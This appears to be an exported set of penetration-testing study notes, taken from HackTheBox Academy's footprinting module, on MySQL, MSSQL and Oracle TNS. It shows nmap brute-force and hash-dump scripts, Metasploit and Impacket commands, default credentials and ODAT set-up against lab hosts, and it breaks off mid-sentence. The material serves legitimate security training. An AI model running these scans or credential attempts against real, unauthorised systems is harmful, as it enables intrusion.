contents|Values|\n\nSensitive data such as passwords can be stored in their plain-text form by MySQL; however, they are generally encrypted beforehand by the PHP scripts using secure methods such as [One-Way-Encryption](https://en.citizendium.org/wiki/One-way_encryption).\n\n#### MySQL Commands\n\nA MySQL database translates the commands internally into executable code and performs the requested actions. The web application informs the user if an error occurs during processing, which various `SQL injections` can provoke. Often, these error descriptions contain important information and confirm, among other things, that the web application interacts with the database in a different way than the developers intended.\n\nThe web application sends the generated information back to the client if the data is processed correctly. This information can be the data extracts from a table or records needed for further processing with logins, search functions, etc. SQL commands can display, modify, add or delete rows in tables. In addition, SQL can also change the structure of tables, create or delete relationships and indexes, and manage users.\n\n`MariaDB`, which is often connected with MySQL, is a fork of the original MySQL code. This is because the chief developer of MySQL left the company `MySQL AB` after it was acquired by `Oracle` and developed another open-source SQL database management system based on the source code of MySQL and called it MariaDB.\n\n---\n\n## Default Configuration\n\nThe management of SQL databases and their configurations is a vast topic. It is so large that entire professions, such as `database administrator`, deal with almost nothing but databases. These structures become very large quickly, and their planning can become complicated. Among other things, DB management is a core competency for `software developers` but also `information security analysts`. To cover this area completely would go beyond the scope of this module. Therefore, we recommend setting up a MySQL/MariaDB instance to experiment with the various configurations to understand the available functionality and configuration options better. Let us have a look at the default configuration of MySQL.\n\n#### Default Configuration\n\nMySQL\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo apt install mysql-server -y\ndrxh3kr@htb[/htb]$ cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v \"#\" | sed -r '/^\\s*$/d'\n\n[client]\nport\t\t= 3306\nsocket\t\t= /var/run/mysqld/mysqld.sock\n\n[mysqld_safe]\npid-file\t= /var/run/mysqld/mysqld.pid\nsocket\t\t= /var/run/mysqld/mysqld.sock\nnice\t\t= 0\n\n[mysqld]\nskip-host-cache\nskip-name-resolve\nuser\t\t= mysql\npid-file\t= /var/run/mysqld/mysqld.pid\nsocket\t\t= /var/run/mysqld/mysqld.sock\nport\t\t= 3306\nbasedir\t\t= /usr\ndatadir\t\t= /var/lib/mysql\ntmpdir\t\t= /tmp\nlc-messages-dir\t= /usr/share/mysql\nexplicit_defaults_for_timestamp\n\nsymbolic-links=0\n\n!includedir /etc/mysql/conf.d/\n```\n\n---\n\n## Dangerous Settings\n\nMany things can be misconfigured with MySQL. We can look in more detail at the [MySQL reference](https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html) to determine which options can be made in the server configuration. The main options that are security-relevant are:\n\n|**Settings**|**Description**|\n|---|---|\n|`user`|Sets which user the MySQL service will run as.|\n|`password`|Sets the password for the MySQL user.|\n|`admin_address`|The IP address on which to listen for TCP/IP connections on the administrative network interface.|\n|`debug`|This variable indicates the current debugging settings|\n|`sql_warnings`|This variable controls whether single-row INSERT statements produce an information string if warnings occur.|\n|`secure_file_priv`|This variable is used to limit the effect of data import and export operations.|\n\nThe settings `user`, `password`, and `admin_address` are security-relevant because the entries are made in plain text. Often, the rights for the configuration file of the MySQL server are not assigned correctly. If we get another way to read files or even a shell, we can see the file and the username and password for the MySQL server. Suppose there are no other security measures to prevent unauthorized access. In that case, the entire database and all the existing customers' information, email addresses, passwords, and personal data can be viewed and even edited.\n\nThe `debug` and `sql_warnings` settings provide verbose information output in case of errors, which are essential for the administrator but should not be seen by others. This information often contains sensitive content, which could be detected by trial and error to identify further attack possibilities. These error messages are often displayed directly on web applications. Accordingly, the SQL injections could be manipulated even to have the MySQL server execute system commands. This is discussed and shown in the module [SQL Injection Fundamentals](https://academy.hackthebox.com/course/preview/sql-injection-fundamentals) and [SQLMap Essentials](https://academy.hackthebox.com/course/preview/sqlmap-essentials).\n\n---\n\n## Footprinting the Service\n\nThere are many reasons why a MySQL server could be accessed from an external network. Nevertheless, it is far from being one of the best practices, and we can always find databases that we can reach. Often, these settings were only meant to be temporary but were forgotten by the administrators. This server setup could also be used as a workaround due to a technical problem. Usually, the MySQL server runs on `TCP port 3306`, and we can scan this port with `Nmap` to get more detailed information.\n\n#### Scanning MySQL Server\n\nMySQL\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2021-09-21 00:53 CEST\nNmap scan report for 10.129.14.128\nHost is up (0.00021s latency).\n\nPORT     STATE SERVICE     VERSION\n3306/tcp open  nagios-nsca Nagios NSCA\n| mysql-brute: \n|   Accounts: \n|     root:<empty> - Valid credentials\n|_  Statistics: Performed 45010 guesses in 5 seconds, average tps: 9002.0\n|_mysql-databases: ERROR: Script execution failed (use -d to debug)\n|_mysql-dump-hashes: ERROR: Script execution failed (use -d to debug)\n| mysql-empty-password: \n|_  root account has empty password\n| mysql-enum: \n|   Valid usernames: \n|     root:<empty> - Valid credentials\n|     netadmin:<empty> - Valid credentials\n|     guest:<empty> - Valid credentials\n|     user:<empty> - Valid credentials\n|     web:<empty> - Valid credentials\n|     sysadmin:<empty> - Valid credentials\n|     administrator:<empty> - Valid credentials\n|     webadmin:<empty> - Valid credentials\n|     admin:<empty> - Valid credentials\n|     test:<empty> - Valid credentials\n|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0\n| mysql-info: \n|   Protocol: 10\n|   Version: 8.0.26-0ubuntu0.20.04.1\n|   Thread ID: 13\n|   Capabilities flags: 65535\n|   Some Capabilities: SupportsLoadDataLocal, SupportsTransactions, Speaks41ProtocolOld, LongPassword, DontAllowDatabaseTableColumn, Support41Auth, IgnoreSigpipes, SwitchToSSLAfterHandshake, FoundRows, InteractiveClient, Speaks41ProtocolNew, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, LongColumnFlag, SupportsCompression, ODBCClient, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults\n|   Status: Autocommit\n|   Salt: YTSgMfqvx\\x0F\\x7F\\x16\\&\\x1EAeK>0\n|_  Auth Plugin Name: caching_sha2_password\n|_mysql-users: ERROR: Script execution failed (use -d to debug)\n|_mysql-variables: ERROR: Script execution failed (use -d to debug)\n|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)\nMAC Address: 00:00:00:00:00:00 (VMware)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 11.21 seconds\n```\n\nAs with all our scans, we must be careful with the results and manually confirm the information obtained because some of the information might turn out to be a false-positive. This scan above is an excellent example of this, as we know for a fact that the target MySQL server does not use an empty password for the user `root`, but a fixed password. We can test this with the following command:\n\n#### Interaction with the MySQL Server\n\nMySQL\n\n```shell-session\ndrxh3kr@htb[/htb]$ mysql -u root -h 10.129.14.132\n\nERROR 1045 (28000): Access denied for user 'root'@'10.129.14.1' (using password: NO)\n```\n\nFor example, if we use a password that we have guessed or found through our research, we will be able to log in to the MySQL server and execute some commands.\n\nMySQL\n\n```shell-session\ndrxh3kr@htb[/htb]$ mysql -u root -pP4SSw0rd -h 10.129.14.128\n\nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MySQL connection id is 150165\nServer version: 8.0.27-0ubuntu0.20.04.1 (Ubuntu)                                                         \nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.                                     \nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.                           \n      \nMySQL [(none)]> show databases;                                                                          \n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| mysql              |\n| performance_schema |\n| sys                |\n+--------------------+\n4 rows in set (0.006 sec)\n\n\nMySQL [(none)]> select version();\n+-------------------------+\n| version()               |\n+-------------------------+\n| 8.0.27-0ubuntu0.20.04.1 |\n+-------------------------+\n1 row in set (0.001 sec)\n\n\nMySQL [(none)]> use mysql;\nMySQL [mysql]> show tables;\n+------------------------------------------------------+\n| Tables_in_mysql                                      |\n+------------------------------------------------------+\n| columns_priv                                         |\n| component                                            |\n| db                                                   |\n| default_roles                                        |\n| engine_cost                                          |\n| func                                                 |\n| general_log                                          |\n| global_grants                                        |\n| gtid_executed                                        |\n| help_category                                        |\n| help_keyword                                         |\n| help_relation                                        |\n| help_topic                                           |\n| innodb_index_stats                                   |\n| innodb_table_stats                                   |\n| password_history                                     |\n...SNIP...\n| user                                                 |\n+------------------------------------------------------+\n37 rows in set (0.002 sec)\n```\n\nIf we look at the existing databases, we will see several already exist. The most important databases for the MySQL server are the `system schema` (`sys`) and `information schema` (`information_schema`). The system schema contains tables, information, and metadata necessary for management. More about this database can be found in the [reference manual](https://dev.mysql.com/doc/refman/8.0/en/system-schema.html#:~:text=The%20mysql%20schema%20is%20the,used%20for%20other%20operational%20purposes) of MySQL.\n\nMySQL\n\n```shell-session\nmysql> use sys;\nmysql> show tables;  \n\n+-----------------------------------------------+\n| Tables_in_sys                                 |\n+-----------------------------------------------+\n| host_summary                                  |\n| host_summary_by_file_io                       |\n| host_summary_by_file_io_type                  |\n| host_summary_by_stages                        |\n| host_summary_by_statement_latency             |\n| host_summary_by_statement_type                |\n| innodb_buffer_stats_by_schema                 |\n| innodb_buffer_stats_by_table                  |\n| innodb_lock_waits                             |\n| io_by_thread_by_latency                       |\n...SNIP...\n| x$waits_global_by_latency                     |\n+-----------------------------------------------+\n\n\nmysql> select host, unique_users from host_summary;\n\n+-------------+--------------+                   \n| host        | unique_users |                   \n+-------------+--------------+                   \n| 10.129.14.1 |            1 |                   \n| localhost   |            2 |                   \n+-------------+--------------+                   \n2 rows in set (0,01 sec)  \n```\n\nThe `information schema` is also a database that contains metadata. However, this metadata is mainly retrieved from the `system schema` database. The reason for the existence of these two is the ANSI/ISO standard that has been established. `System schema` is a Microsoft system catalog for SQL servers and contains much more information than the `information schema`.\n\nSome of the commands we should remember and write down for working with MySQL databases are described below in the table.\n\n|**Command**|**Description**|\n|---|---|\n|`mysql -u <user> -p<password> -h <IP address>`|Connect to the MySQL server. There should **not** be a space between the '-p' flag, and the password.|\n|`show databases;`|Show all databases.|\n|`use <database>;`|Select one of the existing databases.|\n|`show tables;`|Show all available tables in the selected database.|\n|`show columns from <table>;`|Show all columns in the selected table.|\n|`select * from <table>;`|Show everything in the desired table.|\n|`select * from <table> where <column> = \"<string>\";`|Search for needed `string` in the desired table.|\n\nWe must know how to interact with different databases. Therefore, we recommend installing and configuring a MySQL server on one of our VMs for experimentation. There is also a widely covered [security issues](https://dev.mysql.com/doc/refman/8.0/en/general-security-issues.html) section in the reference manual that covers best practices for securing MySQL servers. We should use this when setting up our MySQL server to understand better why something might not work.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/03-Footprinting/15-MSSQL",
    "path": "02_CPTS/03-Footprinting/15-MSSQL.md",
    "title": "15 MSSQL",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Microsoft SQL (MSSQL) is Microsoft's SQL-based relational database management system. Unlike MySQL, which we discussed in the last section, MSSQL is closed source and was initially written to run on W...",
    "category": "02_CPTS",
    "content": "[Microsoft SQL](https://www.microsoft.com/en-us/sql-server/sql-server-2019) (`MSSQL`) is Microsoft's SQL-based relational database management system. Unlike MySQL, which we discussed in the last section, MSSQL is closed source and was initially written to run on Windows operating systems. It is popular among database administrators and developers when building applications that run on Microsoft's .NET framework due to its strong native support for .NET. There are versions of MSSQL that will run on Linux and MacOS, but we will more likely come across MSSQL instances on targets running Windows.\n\n#### MSSQL Clients\n\n[SQL Server Management Studio](https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver15) (`SSMS`) comes as a feature that can be installed with the MSSQL install package or can be downloaded & installed separately. It is commonly installed on the server for initial configuration and long-term management of databases by admins. Keep in mind that since SSMS is a client-side application, it can be installed and used on any system an admin or developer is planning to manage the database from. It doesn't only exist on the server hosting the database. This means we could come across a vulnerable system with SSMS with saved credentials that allow us to connect to the database. The image below shows SSMS in action.\n\n![SQL Server Management Studio showing Object Explorer with 'Employees' database expanded, displaying tables, views, and other database objects.](https://academy.hackthebox.com/storage/modules/112/ssms.png)\n\nMany other clients can be used to access a database running on MSSQL. Including but not limited to:\n\n||||||\n|---|---|---|---|---|\n|[mssql-cli](https://docs.microsoft.com/en-us/sql/tools/mssql-cli?view=sql-server-ver15)|[SQL Server PowerShell](https://docs.microsoft.com/en-us/sql/powershell/sql-server-powershell?view=sql-server-ver15)|[HeidiSQL](https://www.heidisql.com)|[SQLPro](https://www.macsqlclient.com)|[Impacket's mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)|\n\nOf the MSSQL clients listed above, pentesters may find Impacket's mssqlclient.py to be the most useful due to SecureAuthCorp's Impacket project being present on many pentesting distributions at install. To find if and where the client is located on our host, we can use the following command:\n\nMSSQL\n\n```shell-session\ndrxh3kr@htb[/htb]$ locate mssqlclient\n\n/usr/bin/impacket-mssqlclient\n/usr/share/doc/python3-impacket/examples/mssqlclient.py\n```\n\n#### MSSQL Databases\n\nMSSQL has default system databases that can help us understand the structure of all the databases that may be hosted on a target server. Here are the default databases and a brief description of each:\n\n|Default System Database|Description|\n|---|---|\n|`master`|Tracks all system information for an SQL server instance|\n|`model`|Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database|\n|`msdb`|The SQL Server Agent uses this database to schedule jobs & alerts|\n|`tempdb`|Stores temporary objects|\n|`resource`|Read-only database containing system objects included with SQL server|\n\nTable source: [System Databases Microsoft Doc](https://docs.microsoft.com/en-us/sql/relational-databases/databases/system-databases?view=sql-server-ver15)\n\n---\n\n## Default Configuration\n\nWhen an admin initially installs and configures MSSQL to be network accessible, the SQL service will likely run as `NT SERVICE\\MSSQLSERVER`. Connecting from the client-side is possible through Windows Authentication, and by default, encryption is not enforced when attempting to connect.\n\n![SQL Server connection window showing options for server type, server name 'ILF-SQL-01', and Windows Authentication.](https://academy.hackthebox.com/storage/modules/112/auth.png)\n\nAuthentication being set to `Windows Authentication` means that the underlying Windows OS will process the login request and use either the local SAM database or the domain controller (hosting Active Directory) before allowing connectivity to the database management system. Using Active Directory can be ideal for auditing activity and controlling access in a Windows environment, but if an account is compromised, it could lead to privilege escalation and lateral movement across a Windows domain environment. Like with any OS, service, server role, or application, it can be beneficial to set it up in a VM from installation to configuration to understand all the default configurations and potential mistakes that the administrator could make.\n\n---\n\n## Dangerous Settings\n\nIt can be beneficial to place ourselves in the perspective of an IT administrator when we are on an engagement. This mindset can help us remember to look for various settings that may have been misconfigured or configured in a dangerous manner by an admin. A workday in IT can be rather busy, with lots of different projects happening simultaneously and the pressure to perform with speed & accuracy being a reality in many organizations, mistakes can be easily made. It only takes one tiny misconfiguration that could compromise a critical server or service on the network. This applies to just about every network service and server role that can be configured, including MSSQL.\n\nThis is not an extensive list because there are countless ways MSSQL databases can be configured by admins based on the needs of their respective organizations. We may benefit from looking into the following:\n\n- MSSQL clients not using encryption to connect to the MSSQL server\n    \n- The use of self-signed certificates when encryption is being used. It is possible to spoof self-signed certificates\n    \n- The use of [named pipes](https://docs.microsoft.com/en-us/sql/tools/configuration-manager/named-pipes-properties?view=sql-server-ver15)\n    \n- Weak & default `sa` credentials. Admins may forget to disable this account\n    \n\n---\n\n## Footprinting the Service\n\nThere are many ways we can approach footprinting the MSSQL service, the more specific we can get with our scans, the more useful information we will be able to gather. NMAP has default mssql scripts that can be used to target the default tcp port `1433` that MSSQL listens on.\n\nThe scripted NMAP scan below provides us with helpful information. We can see the `hostname`, `database instance name`, `software version of MSSQL` and `named pipes are enabled`. We will benefit from adding these discoveries to our notes.\n\n#### NMAP MSSQL Script Scan\n\nMSSQL\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248\n\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-11-08 09:40 EST\nNmap scan report for 10.129.201.248\nHost is up (0.15s latency).\n\nPORT     STATE SERVICE  VERSION\n1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM\n| ms-sql-ntlm-info: \n|   Target_Name: SQL-01\n|   NetBIOS_Domain_Name: SQL-01\n|   NetBIOS_Computer_Name: SQL-01\n|   DNS_Domain_Name: SQL-01\n|   DNS_Computer_Name: SQL-01\n|_  Product_Version: 10.0.17763\n\nHost script results:\n| ms-sql-dac: \n|_  Instance: MSSQLSERVER; DAC port: 1434 (connection failed)\n| ms-sql-info: \n|   Windows server name: SQL-01\n|   10.129.201.248\\MSSQLSERVER: \n|     Instance name: MSSQLSERVER\n|     Version: \n|       name: Microsoft SQL Server 2019 RTM\n|       number: 15.00.2000.00\n|       Product: Microsoft SQL Server 2019\n|       Service pack level: RTM\n|       Post-SP patches applied: false\n|     TCP port: 1433\n|     Named pipe: \\\\10.129.201.248\\pipe\\sql\\query\n|_    Clustered: false\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 8.52 seconds\n```\n\nWe can also use Metasploit to run an auxiliary scanner called `mssql_ping` that will scan the MSSQL service and provide helpful information in our footprinting process.\n\n#### MSSQL Ping in Metasploit\n\nMSSQL\n\n```shell-session\nmsf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts 10.129.201.248\n\nrhosts => 10.129.201.248\n\n\nmsf6 auxiliary(scanner/mssql/mssql_ping) > run\n\n[*] 10.129.201.248:       - SQL Server information for 10.129.201.248:\n[+] 10.129.201.248:       -    ServerName      = SQL-01\n[+] 10.129.201.248:       -    InstanceName    = MSSQLSERVER\n[+] 10.129.201.248:       -    IsClustered     = No\n[+] 10.129.201.248:       -    Version         = 15.0.2000.5\n[+] 10.129.201.248:       -    tcp             = 1433\n[+] 10.129.201.248:       -    np              = \\\\SQL-01\\pipe\\sql\\query\n[*] 10.129.201.248:       - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n```\n\n#### Connecting with Mssqlclient.py\n\nIf we can guess or gain access to credentials, this allows us to remotely connect to the MSSQL server and start interacting with databases using T-SQL (`Transact-SQL`). Authenticating with MSSQL will enable us to interact directly with databases through the SQL Database Engine. From Pwnbox or a personal attack host, we can use Impacket's mssqlclient.py to connect as seen in the output below. Once connected to the server, it may be good to get a lay of the land and list the databases present on the system.\n\nMSSQL\n\n```shell-session\ndrxh3kr@htb[/htb]$ python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth\n\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\nPassword:\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(SQL-01): Line 1: Changed database context to 'master'.\n[*] INFO(SQL-01): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) \n[!] Press help for extra shell commands\n\nSQL> select name from sys.databases\n\nname                                                                                                                               \n\n--------------------------------------------------------------------------------------\n\nmaster                                                                                                                             \n\ntempdb                                                                                                                             \n\nmodel                                                                                                                              \n\nmsdb                                                                                                                               \n\nTransactions    \n```\n",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/03-Footprinting/16-Oracle TNS",
    "path": "02_CPTS/03-Footprinting/16-Oracle TNS.md",
    "title": "16 Oracle TNS",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "The Oracle Transparent Network Substrate (TNS) server is a communication protocol that facilitates communication between Oracle databases and applications over networks. Initially introduced as part o...",
    "category": "02_CPTS",
    "content": "The `Oracle Transparent Network Substrate` (`TNS`) server is a communication protocol that facilitates communication between Oracle databases and applications over networks. Initially introduced as part of the [Oracle Net Services](https://docs.oracle.com/en/database/oracle/oracle-database/18/netag/introducing-oracle-net-services.html) software suite, TNS supports various networking protocols between Oracle databases and client applications, such as `IPX/SPX` and `TCP/IP` protocol stacks. As a result, it has become a preferred solution for managing large, complex databases in the healthcare, finance, and retail industries. In addition, its built-in encryption mechanism ensures the security of data transmitted, making it an ideal solution for enterprise environments where data security is paramount.\n\nOver time, TNS has been updated to support newer technologies, including `IPv6` and `SSL/TLS` encryption which makes it more suitable for the following purposes:\n\n|||||\n|---|---|---|---|\n|Name resolution|Connection management|Load balancing|Security|\n\nFurthermore, it enables encryption between client and server communication through an additional layer of security over the TCP/IP protocol layer. This feature helps secure the database architecture from unauthorized access or attacks that attempt to compromise the data on the network traffic. Besides, it provides advanced tools and capabilities for database administrators and developers since it offers comprehensive performance monitoring and analysis tools, error reporting and logging capabilities, workload management, and fault tolerance through database services.\n\n---\n\n## Default Configuration\n\nThe default configuration of the Oracle TNS server varies depending on the version and edition of Oracle software installed. However, some common settings are usually configured by default in Oracle TNS. By default, the listener listens for incoming connections on the `TCP/1521` port. However, this default port can be changed during installation or later in the configuration file. The TNS listener is configured to support various network protocols, including `TCP/IP`, `UDP`, `IPX/SPX`, and `AppleTalk`. The listener can also support multiple network interfaces and listen on specific IP addresses or all available network interfaces. By default, Oracle TNS can be remotely managed in `Oracle 8i`/`9i` but not in Oracle 10g/11g.\n\nThe default configuration of the TNS listener also includes a few basic security features. For example, the listener will only accept connections from authorized hosts and perform basic authentication using a combination of hostnames, IP addresses, and usernames and passwords. Additionally, the listener will use Oracle Net Services to encrypt the communication between the client and the server. The configuration files for Oracle TNS are called `tnsnames.ora` and `listener.ora` and are typically located in the `$ORACLE_HOME/network/admin` directory. The plain text file contains configuration information for Oracle database instances and other network services that use the TNS protocol.\n\nOracle TNS is often used with other Oracle services like Oracle DBSNMP, Oracle Databases, Oracle Application Server, Oracle Enterprise Manager, Oracle Fusion Middleware, web servers, and many more. There have been made many changes for the default installation of Oracle services. For example, Oracle 9 has a default password, `CHANGE_ON_INSTALL`, whereas Oracle 10 has no default password set. The Oracle DBSNMP service also uses a default password, `dbsnmp` that we should remember when we come across this one. Another example would be that many organizations still use the `finger` service together with Oracle, which can put Oracle's service at risk and make it vulnerable when we have the required knowledge of a home directory.\n\nEach database or service has a unique entry in the [tnsnames.ora](https://docs.oracle.com/cd/E11882_01/network.112/e10835/tnsnames.htm#NETRF007) file, containing the necessary information for clients to connect to the service. The entry consists of a name for the service, the network location of the service, and the database or service name that clients should use when connecting to the service. For example, a simple `tnsnames.ora` file might look like this:\n\n#### Tnsnames.ora\n\nCode: txt\n\n```txt\nORCL =\n  (DESCRIPTION =\n    (ADDRESS_LIST =\n      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))\n    )\n    (CONNECT_DATA =\n      (SERVER = DEDICATED)\n      (SERVICE_NAME = orcl)\n    )\n  )\n```\n\nHere we can see a service called `ORCL`, which is listening on port `TCP/1521` on the IP address `10.129.11.102`. Clients should use the service name `orcl` when connecting to the service. However, the tnsnames.ora file can contain many such entries for different databases and services. The entries can also include additional information, such as authentication details, connection pooling settings, and load balancing configurations.\n\nOn the other hand, the `listener.ora` file is a server-side configuration file that defines the listener process's properties and parameters, which is responsible for receiving incoming client requests and forwarding them to the appropriate Oracle database instance.\n\n#### Listener.ora\n\nCode: txt\n\n```txt\nSID_LIST_LISTENER =\n  (SID_LIST =\n    (SID_DESC =\n      (SID_NAME = PDB1)\n      (ORACLE_HOME = C:\\oracle\\product\\19.0.0\\dbhome_1)\n      (GLOBAL_DBNAME = PDB1)\n      (SID_DIRECTORY_LIST =\n        (SID_DIRECTORY =\n          (DIRECTORY_TYPE = TNS_ADMIN)\n          (DIRECTORY = C:\\oracle\\product\\19.0.0\\dbhome_1\\network\\admin)\n        )\n      )\n    )\n  )\n\nLISTENER =\n  (DESCRIPTION_LIST =\n    (DESCRIPTION =\n      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))\n      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))\n    )\n  )\n\nADR_BASE_LISTENER = C:\\oracle\n```\n\nIn short, the client-side Oracle Net Services software uses the `tnsnames.ora` file to resolve service names to network addresses, while the listener process uses the `listener.ora` file to determine the services it should listen to and the behavior of the listener.\n\nOracle databases can be protected by using so-called PL/SQL Exclusion List (`PlsqlExclusionList`). It is a user-created text file that needs to be placed in the `$ORACLE_HOME/sqldeveloper` directory, and it contains the names of PL/SQL packages or types that should be excluded from execution. Once the PL/SQL Exclusion List file is created, it can be loaded into the database instance. It serves as a blacklist that cannot be accessed through the Oracle Application Server.\n\n|**Setting**|**Description**|\n|---|---|\n|`DESCRIPTION`|A descriptor that provides a name for the database and its connection type.|\n|`ADDRESS`|The network address of the database, which includes the hostname and port number.|\n|`PROTOCOL`|The network protocol used for communication with the server|\n|`PORT`|The port number used for communication with the server|\n|`CONNECT_DATA`|Specifies the attributes of the connection, such as the service name or SID, protocol, and database instance identifier.|\n|`INSTANCE_NAME`|The name of the database instance the client wants to connect.|\n|`SERVICE_NAME`|The name of the service that the client wants to connect to.|\n|`SERVER`|The type of server used for the database connection, such as dedicated or shared.|\n|`USER`|The username used to authenticate with the database server.|\n|`PASSWORD`|The password used to authenticate with the database server.|\n|`SECURITY`|The type of security for the connection.|\n|`VALIDATE_CERT`|Whether to validate the certificate using SSL/TLS.|\n|`SSL_VERSION`|The version of SSL/TLS to use for the connection.|\n|`CONNECT_TIMEOUT`|The time limit in seconds for the client to establish a connection to the database.|\n|`RECEIVE_TIMEOUT`|The time limit in seconds for the client to receive a response from the database.|\n|`SEND_TIMEOUT`|The time limit in seconds for the client to send a request to the database.|\n|`SQLNET.EXPIRE_TIME`|The time limit in seconds for the client to detect a connection has failed.|\n|`TRACE_LEVEL`|The level of tracing for the database connection.|\n|`TRACE_DIRECTORY`|The directory where the trace files are stored.|\n|`TRACE_FILE_NAME`|The name of the trace file.|\n|`LOG_FILE`|The file where the log information is stored.|\n\nBefore we can enumerate the TNS listener and interact with it, we need to download a few packages and tools for our `Pwnbox` instance in case it does not have these already. Here is a Bash script that does all of that:\n\n#### Setting up\n\nOracle TNS\n\n```shell-session\ndrxh3kr@htb[/htb]$ wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip\nwget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip\nsudo mkdir -p /opt/oracle\nsudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip\nsudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip\nexport LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH\nexport PATH=$LD_LIBRARY_PATH:$PATH\nsource ~/.bashrc\ncd ~\ngit clone https://github.com/quentinhardy/odat.git\ncd odat/\npip install python-libnmap\ngit submodule init\ngit submodule update\npip3 install cx_Oracle\nsudo apt-get install python3-scapy -y\nsudo pip3 install colorlog termcolor passlib python-libnmap\nsudo apt-get install build-essential libgmp-dev -y\npip3 install pycryptodome\n\n--2025-06-24 00:24:53--  https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip\nResolving download.oracle.com (download.oracle.com)... 23.58.104.121\nConnecting to download.oracle.com (download.oracle.com)|23.58.104.121|:443... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 79386308 (76M) [application/zip]\nSaving to: ‘instantclient-basic-linux.x64-21.4.0.0.0dbru.zip’\n\n<SNIP>\n```\n\nAfter that, we can try to determine if the installation was successful by running the following command:\n\n#### Testing ODAT\n\nOracle TNS\n\n```shell-session\ndrxh3kr@htb[/htb]$ ./odat.py -h\n\nusage: odat.py [-h] [--version]\n               {all,tnscmd,tnspoison,sidguesser,snguesser,passwordguesser,utlhttp,httpuritype,utltcp,ctxsys,externaltable,dbmsxslprocessor,dbmsadvisor,utlfile,dbmsscheduler,java,passwordstealer,oradbg,dbmslob,stealremotepwds,userlikepwd,smb,privesc,cve,search,unwrapper,clean}\n               ...\n\n            _  __   _  ___ \n           / \\|  \\ / \\|_ _|\n          ( o ) o ) o || | \n           \\_/|__/|_n_||_| \n-------------------------------------------\n  _        __           _           ___ \n / \\      |  \\         / \\         |_ _|\n( o )       o )         o |         | | \n \\_/racle |__/atabase |_n_|ttacking |_|ool \n-------------------------------------------\n\nBy Quentin Hardy (quentin.hardy@protonmail.com or quentin.hardy@bt.com)\n...SNIP...\n```\n\nOracle Database Attacking Tool (`ODAT`) is an open-source penetration testing tool written in Python and designed to enumerate and exploit vulnerabilities in Oracle databases. It can be used to identify and exploit various security flaws in Oracle databases, including SQL injection, remote code execution, and privilege escalation.\n\nLet's now use `nmap` to scan the default Oracle TNS listener port.\n\n#### Nmap\n\nOracle TNS\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open\n\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 10:59 EST\nNmap scan report for 10.129.204.235\nHost is up (0.0041s latency).\n\nPORT     STATE SERVICE    VERSION\n1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 6.64 seconds\n```\n\nWe can see that the port is open, and the service is running. In Oracle RDBMS, a System Identifier (`SID`) is a unique name that identifies a particular database instance. It can have multiple instances, each with its own System ID. An instance is a set of processes and memory structures that interact to manage the database's data. When a client connects to an Oracle database, it specifies the database's `SID` along with its connection string. The client uses this SID to identify which database instance it wants to connect to. Suppose the client does not specify a SID. Then, the default value defined in the `tnsnames.ora` file is 